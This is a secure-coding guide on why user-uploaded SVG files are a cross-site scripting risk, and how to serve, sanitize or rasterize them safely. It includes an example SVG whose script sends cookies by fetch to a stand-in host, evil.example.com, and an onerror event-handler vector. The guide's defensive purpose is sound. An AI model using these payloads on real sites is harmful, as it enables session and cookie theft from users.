# SVG Files as XSS Vectors

SVG is an XML-based format that supports embedded scripts, event handlers, and external resource loading. An SVG file is not just an image — it is executable code if rendered by the browser as `text/html` or `image/svg+xml` with script execution enabled. User-uploaded SVGs are a critical XSS risk.

## Why SVG Is Different from JPEG/PNG

JPEG and PNG are binary image formats. They contain pixel data, not executable markup. A browser cannot execute a JPEG as a script, regardless of its content.

SVG is XML. A valid SVG file can contain:

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>document.cookie = 'stolen=' + document.cookie; fetch('https://evil.example.com/?c=' + document.cookie)</script>
  <circle r="50" cx="50" cy="50"/>
</svg>
```

Or event-based vectors that don't even need `<script>`:

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="x" onerror="alert(document.domain)"/>
</svg>
```

When this file is served from your domain with `Content-Type: image/svg+xml` and loaded directly (not in an `<img>` tag), the browser executes the script in the context of your origin. The attacker has full JavaScript execution on your domain — they can steal cookies, exfiltrate localStorage, and perform actions as the authenticated user.

## Never Serve User-Uploaded SVGs as image/svg+xml

The rule is absolute: **never serve user-uploaded SVG files with `Content-Type: image/svg+xml`**.

Two safe alternatives:

**Option 1 — Content-Type: text/plain**
Serving the file as `text/plain` causes the browser to display the raw XML as text, not render or execute it. Safe for downloads. Not suitable for display.

**Option 2 — Proxy through an SVG sanitizer**
Before storing or serving the SVG, pass it through a sanitizer that removes `<script>` elements, event handler attributes (`onload`, `onerror`, `onclick`, etc.), `<use href>` external references, and `<image>` elements with external hrefs.

Libraries: `DOMPurify` (browser-side), `svgo` with specific plugins (lossy), `sanitize-html` (Node.js). Always verify sanitizer coverage — new SVG attack vectors emerge.

**Option 3 — Rasterize to PNG**
Convert the SVG to a PNG on upload using a server-side renderer (Inkscape, `sharp`, Puppeteer with sandboxing). The stored file is a bitmap, not an SVG. No execution risk. Loses SVG's resolution independence.

## img Tag vs Inline SVG Security

**`<img>` tag**: When an SVG is loaded via `<img src="...">`, modern browsers sandbox it — scripts in the SVG do not execute, and the SVG cannot access the parent document's cookies or DOM. This is safe for displaying SVGs from untrusted sources *if* the file is served from a different origin (e.g., a CDN or storage bucket), not your application origin.

If the same `image/svg+xml` file is served from your origin (e.g., `/uploads/user.svg`) and loaded via `<img>`, the script sandboxing holds — but the file is also directly accessible at its URL. A user who navigates directly to `https://yourapp.com/uploads/user.svg` in their browser will get script execution on your origin.

**Inline SVG** (`<svg>` directly in HTML): Inlined SVG is fully part of the page DOM. Scripts in inlined SVGs execute with the page's origin context. Never inline user-uploaded SVG content without sanitization.

## Content-Disposition for Forced Download

If users need to download their uploaded SVGs, add `Content-Disposition: attachment; filename="file.svg"`. This forces a download dialog instead of browser rendering, preventing execution.

## Key Rules

- Never serve user-uploaded SVGs with `Content-Type: image/svg+xml` from your application domain
- SVGs can contain `<script>` tags and event handlers — they are executable content, not just images
- Use `Content-Type: text/plain`, sanitize before serving, or rasterize to PNG for user-uploaded SVGs
- `<img>` tags sandbox SVG scripts, but only when the SVG is on a different origin — same-origin SVG URLs are still dangerous if loaded directly
- Never inline user-uploaded SVG content into your HTML without passing it through a whitelist-based sanitizer
- For downloads, add `Content-Disposition: attachment` to prevent browser rendering
